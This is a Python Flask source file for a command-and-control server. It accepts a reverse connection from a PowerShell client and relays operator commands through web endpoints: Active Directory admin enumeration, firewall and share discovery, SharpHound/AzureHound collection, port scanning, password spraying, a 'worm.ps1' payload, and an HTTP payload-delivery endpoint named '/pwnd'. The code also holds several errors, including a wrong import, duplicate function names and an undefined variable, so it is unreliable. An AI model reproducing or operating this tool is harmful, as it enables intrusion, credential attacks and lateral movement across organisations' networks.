from flask import Flask, requests, render_template
import socket
import threading
import queue
import logging

app = Flask(__name__)

#Create file for logging
log = open("log.log","w")
log.close()

# Queue to hold commands to send
command_queue = queue.Queue()
# Queue to hold command results
result_queue = queue.Queue()

def handle_client(client_socket):
    try:
        while True:
            # Wait for a command to be available in the queue
            command = command_queue.get()
            if command == 'exit':
                break  # Exit the loop if 'exit' command is placed in the queue

            # Send the command
            client_socket.sendall(command.encode() + b'\n')

            # Receiving the response from the client
            output = client_socket.recv(4096).decode()
            #print(f"Output from the PowerShell client: {output}")
            result_queue.put(output)  # Store the result in the queue
            command_queue.task_done()
            if output:
                f = open("log.log", "a")#Write results to log file
                f.write(output)
                f.close() 
                output = "" 
            if q.qsize() >= 20:
                while not q.empty():
                    try:
                        q.get_nowait()
                    except queue.Empty:
                        break 
           
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Closing the connection
        client_socket.close()

def start_socket_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[*] Socket Listening on {host}:{port}")

    client_socket, addr = server_socket.accept()
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
    client_handler = threading.Thread(target=handle_client, args=(client_socket,))
    client_handler.start()

# Start the socket server in a separate thread
threading.Thread(target=start_socket_server).start()


#Flask Endpoints
@app.route('/')
def hello():
  return render_template('index.html')

@app.route('/cmd/<cmd>', methods=['GET'])
def send_command(cmd):
    command_queue.put(cmd)
    return f"Custom command sent to the PowerShell client."

@app.route('/result', methods=['GET'])
def get_last_result():
    try:
       result = result_queue.get_nowait()
    except queue.Empty:
        result = "No results available yet."
    return result

@app.route('/allresults', methods=['GET'])
def get_last_result():
    f = open('log.log', 'r')
    result = f.read()
    f.close()
    return result

@app.route('/clear', methods=['GET'])
def get_last_result():
    f = open('log.log', 'w')
    f.close()
    return f"Results have been cleared"

@app.route('/admins', methods=[GET])
def enum_admins(): 
    cmd = '$groups = @("Administrators", "Backup Operators", "Hyper-V Administrators", "Domain Controllers", "Schema Admins", "Enterprise Admins", "Cert Publishers", "Domain Admins", "Group Policy Creator Owners", "Server Operators", "Protected Users", "Enterprise Key Admins", "DnsAdmins");Get-ADUser -Filter * -Properties * | ?{$_.samaccountname -like "*admin*" -or $_.memberof -like "*admin*"} | select samaccountname,name,description,distinguishedname,doesnotrequirepreauth,emailaddress,lastlogondate,memberof,passwordlastset,trustedfordelegation,trustedtoauthfordelegation,userprincipalname;$groups | foreach{$group = $_; Get-ADGroupMember $group}'
    command_queue.put(cmd)
    return f"Enum Admins Command sent to the PowerShell client."

@app.route('/whoami', methods=[GET])
def enum_whoami():
    cmd = "whoami /all; Get-ADUser $env:USERNAME -Properties *"
    command_queue.put(cmd) 
    return "Whoami command sent to the PowerShell client."

@app.route('/firewall', methods=[GET])
def enum_whoami():
    cmd = "Get-NetFirewallProfile -ErrorAction SilentlyContinue ; Get-NetFirewallRule -ErrorAction SilentlyContinue"
    command_queue.put(cmd) 
    return "Firewall enumeration command sent to the PowerShell client."
   
@app.route('/services', methods=[GET])
def enum_svc():
    cmd = "Get-Service"
    command_queue.put(cmd) 
    return "Services command sent to the PowerShell client." 

@app.route('/services/dc', methods=[GET])
def enum_DCsvc():
    cmd = 'Get-ADDomainController | foreach{Get-WMIObject Win32_Service -computer $_.name}'
    command_queue.put(cmd) 
    return "DC Services command sent to the PowerShell client."  

#Endpoint for HTTP payload delivery
@app.route('/pwnd',methods = ['POST', 'GET'])
def com_ctrl():
   if request.method == 'GET':
      # Retrieve the 'text_data' parameter from the query string
      command = command_queue.get() 
      return command

   if request.method == 'POST':
      data = request.args.get('text_data', 'Default Value')
      f = open("log.log", "a")#Command_queue
      f.write(data)
      f.close()   
      result_queue.put(data)
      return 
   
@app.route('/shares/all', methods=[GET])
def shares_all():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/getsharesall.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Get shares command sent to Powershell client"

@app.route('/shares', methods=[GET])
def shares_servers():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/servershares.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Get server shares command sent to Powershell client"

@app.route('/trimarc', methods=[GET])
def invoke_trimarc():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/trimarc.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Trimarc checks sent to Powershell client"

@app.route('/dns', methods=[GET])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/enumdns.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "DNS enumeration command sent to Powershell client"

@app.route('/protosign', methods=[GET])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/proto.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Protocol signing enumeration command sent to Powershell client"

@app.route('/portscan', methods=[GET])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/portscan.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "DNS enumeration command sent to Powershell client"

@app.route('/passspray', methods=[GET])
def invoke_passspray():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/passspray.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Password spray sent to Powershell client"

@app.route('/moab', methods=[GET])
def hail_moab():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/worm.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Sprayin' and prayin'"

@app.route('/azurehound', methods=[GET])
def azure_hound():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/azurehound.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Attempting Azurehound collection"

@app.route('/sharphound', methods=[GET])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open(r'sharphound.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Attempting Sharphound collection"

@app.route('/exchange', methods=[GET])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open(r'exchange.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "Excahnge vulnerability scan command sent to Powershell client"

#Azure enumerator

#kill all connections
@app.route('/kill', methods=['GET'])
def kill_conns():
    command_queue.put("exit")
    return f"Connection kill command sent."
"""
@app.route('/clients', methods=[GET])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open(r'commands/enumdns.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return "DNS enumeration command sent to Powershell client"
"""
# Start Flask Server
if __name__ == '__main__':
    app.run(host= '0.0.0.0',port=80, debug=False) 